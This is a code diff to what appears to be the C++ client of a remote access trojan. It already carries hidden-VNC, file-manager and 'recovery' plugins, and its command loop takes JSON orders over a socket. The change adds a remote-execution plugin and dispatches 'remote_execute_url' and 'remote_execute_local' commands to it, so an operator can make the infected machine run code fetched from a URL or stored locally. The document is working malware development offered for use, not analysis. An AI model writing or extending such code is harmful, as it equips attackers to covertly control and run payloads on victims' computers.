@@ -104,6 +104,7 @@ private:
     const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
     const string HIDDEN_VNC_PLUGIN_ID = "HiddenVNCPlugin";
     const string RECOVERY_PLUGIN_ID = "RecoveryPlugin";
+    const string REMOTE_EXECUTION_PLUGIN_ID = "RemoteExecutionPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -205,6 +206,14 @@ private:
         }
     }
 
+    void execute_remote_execution_command(const json& data) {
+        if (pluginMgr.isPluginLoaded(REMOTE_EXECUTION_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(REMOTE_EXECUTION_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(REMOTE_EXECUTION_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -247,6 +256,9 @@ private:
 			}
             else if (action == "recovery") {
                 execute_recovery_command(data);
+            }
+            else if (action == "remote_execute_url" || action == "remote_execute_local") {
+                execute_remote_execution_command(data);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
@@ -371,6 +383,12 @@ private:
                                     thread([this, currentSock]() {
                                         pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", currentSock);
                                     }).detach();
+                                } else if (pluginId == REMOTE_EXECUTION_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(REMOTE_EXECUTION_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                    } else {
+                                        pluginMgr.executePlugin(REMOTE_EXECUTION_PLUGIN_ID, "RunPlugin", sock);
+                                    }
                                 }
                             }
 
